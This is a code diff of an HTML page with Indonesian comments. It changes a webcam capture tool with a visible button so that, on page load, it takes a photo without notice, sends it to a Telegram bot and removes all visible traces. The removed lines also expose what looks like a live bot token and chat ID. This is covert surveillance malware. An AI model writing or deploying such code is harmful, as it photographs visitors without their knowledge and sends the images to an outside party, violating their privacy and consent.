@@ -3,35 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Webcam Capture and Telegram</title>
+  <title>Automatic Camera Capture and Telegram</title>
 </head>
 <body>
-  <h1>Webcam Capture and Telegram</h1>
-  <video id="video" width="640" height="480" autoplay></video><br>
-  <button onclick="takePicture()">Capture</button>
+  <h1>Automatic Camera Capture and Telegram</h1>
 
   <script>
-    // Fungsi untuk mengambil gambar dari video stream
-    function takePicture() {
-      var canvas = document.createElement('canvas');
-      var context = canvas.getContext('2d');
-      var video = document.getElementById('video');
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Mengambil data gambar dalam bentuk base64
-      var imageDataURL = canvas.toDataURL('image/png');
-
-      // Kirim gambar ke fungsi untuk mengirim ke Telegram
-      sendToTelegram(imageDataURL);
-    }
-
     // Fungsi untuk mengirim gambar ke Telegram
     function sendToTelegram(imageDataURL) {
-      var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
-      var chatId = '-1002188815934';
+      var token = 'YOUR_TELEGRAM_BOT_TOKEN';
+      var chatId = 'YOUR_TELEGRAM_CHAT_ID';
 
       // API endpoint untuk mengirim pesan gambar
       var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
@@ -49,26 +30,45 @@
       .then(response => response.json())
       .then(data => {
         console.log('Gambar berhasil dikirim ke Telegram:', data);
-        alert('Gambar berhasil dikirim ke Telegram!');
       })
       .catch(error => {
         console.error('Error mengirim gambar ke Telegram:', error);
-        alert('Terjadi kesalahan saat mengirim gambar ke Telegram.');
       });
     }
 
-    // Mendapatkan akses ke kamera pengguna
+    // Mendapatkan akses ke kamera pengguna secara otomatis
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(function(stream) {
-        var video = document.getElementById('video');
+        var video = document.createElement('video');
+        document.body.appendChild(video);
         video.srcObject = stream;
         video.onloadedmetadata = function(e) {
           video.play();
+
+          // Mengambil gambar setelah izin diberikan
+          setTimeout(function() {
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Mengambil data gambar dalam bentuk base64
+            var imageDataURL = canvas.toDataURL('image/png');
+
+            // Kirim gambar ke fungsi untuk mengirim ke Telegram
+            sendToTelegram(imageDataURL);
+
+            // Hentikan stream video setelah mengambil gambar
+            video.srcObject.getTracks().forEach(track => track.stop());
+
+            // Hapus elemen video dari dokumen
+            video.parentNode.removeChild(video);
+          }, 1000); // Waktu delay sebelum mengambil gambar (dalam milidetik)
         };
       })
       .catch(function(err) {
         console.log("Error: " + err);
-        alert("Tidak dapat mengakses kamera. Pastikan Anda memberikan izin akses.");
       });
   </script>
 </body>
